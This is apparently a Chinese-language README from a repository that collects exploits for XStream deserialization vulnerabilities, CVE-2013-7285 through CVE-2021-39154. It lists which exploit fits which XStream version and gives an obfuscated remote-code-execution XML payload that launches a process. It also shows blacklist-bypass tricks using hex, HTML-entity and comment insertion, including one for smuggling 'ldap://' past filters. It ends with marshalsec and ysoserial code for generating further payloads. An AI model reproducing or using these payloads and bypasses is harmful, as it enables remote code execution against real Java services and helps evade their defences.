# Xstream

>该项目是为了整理Xstream的exp，有一些没有测试成功，欢迎pr。
>
>本来想写一个工具了生成exp，然后感觉这样整理出来也比较方便。。。。。懒。。

| XStream 远程代码执行漏洞 | CVE-2013-7285                                                | 1.4.x<XStream <= 1.4.6&=1.4.10 |
| ------------------------ | ------------------------------------------------------------ | ------------------------------ |
| XStream XXE              | [CVE-2016-3674](https://x-stream.github.io/CVE-2016-3674.html) | 1.4.x<`XStream` <= 1.4.8       |
| XStream 远程代码执行漏洞 | CVE-2019-10173                                               | `XStream` = 1.4.10             |
| XStream 远程代码执行漏洞 | [CVE-2020-26217](https://x-stream.github.io/CVE-2020-26217.html) | 1.4.x<`XStream` <= 1.4.13      |
| XStream 远程代码执行漏洞 | [CVE-2021-21344](https://x-stream.github.io/CVE-2021-21344.html) | 1.4.x<`XStream`: <= 1.4.15     |
| XStream 远程代码执行漏洞 | [CVE-2021-21345](https://x-stream.github.io/CVE-2021-21345.html) | 1.4.x<`XStream`: <= 1.4.15     |
| XStream 远程代码执行漏洞 | [CVE-2021-21346](https://x-stream.github.io/CVE-2021-21346.html) | 1.4.x<`XStream`: <= 1.4.15     |
| XStream 远程代码执行漏洞 | [CVE-2021-21347](https://x-stream.github.io/CVE-2021-21347.html) | 1.4.x<`XStream`<= 1.4.15       |
| XStream 远程代码执行漏洞 | [CVE-2021-21350](https://x-stream.github.io/CVE-2021-21350.html) | 1.4.x<`XStream`: <= 1.4.15     |
| XStream 远程代码执行漏洞 | [CVE-2021-21351](https://x-stream.github.io/CVE-2021-21351.html) | 1.4.x<`XStream`: <= 1.4.15     |
| XStream 远程代码执行漏洞 | [CVE-2021-29505](https://x-stream.github.io/CVE-2021-29505.html) | 1.4.x<`XStream`: <= 1.4.16     |
| XStream 远程代码执行漏洞 | CVE-2021-39141                                               | 1.4.x<`XStream`: <= 1.4.17     |
| XStream 远程代码执行漏洞 | CVE-2021-39144                                               | 1.4.x<`XStream`: <= 1.4.17     |
| XStream 远程代码执行漏洞 | CVE-2021-39146                                               | 1.4.x<`XStream`: <= 1.4.17     |
| XStream 远程代码执行漏洞 | CVE-2021-39148                                               | 1.4.x<`XStream`: <= 1.4.17     |
| XStream 远程代码执行漏洞 | CVE-2021-39152                                               | 1.4.x<`XStream`: <= 1.4.17     |
| XStream 远程代码执行漏洞 | CVE-2021-39154                                               | 1.4.x<`XStream`: <= 1.4.17     |



## 利用规则

  <1.4.6        [CVE-2013-7285](exp/RCE/CVE-2013-7285.xml)
  
 =1.4.10       [CVE-2019-10173](exp/RCE/CVE-2019-10173.xml)  && [CVE-2013-7285](exp/RCE/CVE-2013-7285.xml)
 
<=1.4.13      [CVE-2020-26217](exp/RCE/CVE-2020-26217.xml)

<=1.4.15      [CVE-2021-21345](exp/RCE/CVE-2021-21345.xml) &&  [CVE-2021-21344](exp/RCE/CVE-2021-21344.xml)  &&  [CVE-2021-21351](exp/RCE/CVE-2021-21351.xml)

<=1.4.16      [CVE-2021-29505](exp/RCE/CVE-2021-29505.xml)

<=1.4.17      [CVE-2021-39141](exp/RCE/CVE-2021-39141.xml) && [CVE-2021-39144](exp/RCE/CVE-2021-39144.xml) && [CVE-2021-39146](exp/RCE/CVE-2021-39146.XML)



## 绕过

eg：

```java
<sorted-set>
    <string></string>
    <dynamic-proxy>
        <interface>ja<!-- -->va<!-- -->.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.Pro&#99;essBuilder">
                <command>
                    <string>&#99;a<!-- test -->lc.exe</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```



```xml
1. 16进制绕过

<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
当前黑名单为org[.]springframework，此时的绕过方法可以为
<org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
</org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>

2. 针对标签属性内容的绕过

<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="custom">
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
此时的黑名单为custom，那么绕过方法可以为

<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="cust&#111;m">
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
原理为读取属性内容时，会做符合要求的转化

3. 针对标签内容的绕过
<test>
ldap://xxxxx
</test>
此时的黑名单为ldap://，可以用如下的几种方法绕过

html编码:
这部分在提取数据时，同样对html编码的内容做了转化
<test>
&#108;dap://xxxxx
</test>

注释的方法:
在处理实际的标签内容时，遇到注视内容将被忽略掉
<test>
ld<!-- test -->ap://xxxxx
</test>
```


## 工具生成poc


```
java.exe -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream
```



配合yso生成xstream的exp。添加Xstream组件依赖

```java
package ysoserial.exploit;

import clojure.lang.IFn;
import com.thoughtworks.xstream.XStream;
import ysoserial.payloads.ObjectPayload;

@SuppressWarnings({
    "rawtypes"
})

public class Xstream {
    public static void main(String[] args) {
        if(args.length<2){
            System.out.println("exit");
        }
        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(args[0],args[1]);
        com.thoughtworks.xstream.XStream xstream = new XStream();
        //System.out.println(payloadObject);
        String s = xstream.toXML(payloadObject);
        System.out.println(s);
        ObjectPayload.Utils.releasePayload(args[0],payloadObject);
    }
}
```



